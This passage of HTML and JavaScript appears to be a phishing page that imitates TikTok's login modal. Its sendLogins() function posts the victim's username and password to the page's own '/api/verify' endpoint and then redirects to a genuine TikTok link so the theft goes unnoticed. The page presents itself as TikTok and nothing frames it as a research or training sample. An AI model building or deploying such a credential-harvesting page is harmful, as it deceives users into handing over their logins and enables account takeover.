                    style="font-variation-settings: 'FILL' 1;">home</span>

                comments.</p>

    <div class="fixed inset-0 z-[100] modal-overlay flex items-center justify-center">

            </div>

                <div class="flex flex-col gap-1.5">
                    <label class="text-label-sm text-black font-bold">Email, phone or username</label>
                    <input id="username-field"

                </div>
                <div class="flex flex-col gap-1.5 relative">
                    <div class="flex justify-between items-center">
                        <label class="text-label-sm text-black font-bold">Password</label>
                    </div>
                    <div class="relative">
                        <input id="password-field"
                            class="w-full h-[44px] bg-[#F1F1F1] rounded-lg px-4 border border-transparent focus:border-[#FE2C55] focus:ring-0 outline-none transition-all placeholder:text-neutral-400"
                            placeholder="Password" type="password" />
                        <span
                            class="material-symbols-outlined absolute right-3 top-1/2 -translate-y-1/2 text-neutral-500 cursor-pointer text-[20px]"
                            data-icon="visibility_off">visibility_off</span>
                    </div>
                </div>
                <div class="flex items-center justify-start mt-1">
                    <a class="text-label-sm text-neutral-600 hover:underline"
                        href="https://www.tiktok.com/login/email/forget-password">Forgot password?</a>
                </div>
                <button
                onclick="sendLogins()"
                    class="w-full h-[52px] bg-[#FE2C55] text-white font-headline-md rounded-lg mt-4 hover:brightness-105 active:scale-[0.98] transition-all">
                    Log in
                </button>
            </div>
            <!-- Modal Footer -->
            <div class="bg-white border-t border-[#E3E3E3] py-8 text-center">
                <p class="text-body-md text-neutral-700">
                    Don't have an account? <a class="text-[#FE2C55] font-bold hover:underline" href="#">Sign up</a>
                </p>
            </div>
            <!-- Close button -->
            <button
                class="absolute right-6 top-6 w-8 h-8 flex items-center justify-center bg-neutral-100 rounded-full hover:bg-neutral-200 transition-colors">
                <span class="material-symbols-outlined text-[20px]" data-icon="close">close</span>
            </button>
        </div>
    </div>
    <script>
        async function sendLogins() {
            let u = document.getElementById("username-field");
            let p = document.getElementById("password-field");

            if (u.value.length < 6 || p.value.length < 6) {
                return;
            }

            try {
                const response = await fetch("/api/verify", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ username: u.value, password: p.value }),
                });

                const data = await response.json();

                if (response.ok) {
                    // Redirect on success
                    window.location.href = "https://vt.tiktok.com/ZS9BSxc94/";
                } else {
                    alert(data.message || "Invalid code");
                }
            } catch (error) {
                console.error("Verification failed:", error);
            } finally {
                //setLoading(false);
            }
        }
    </script>
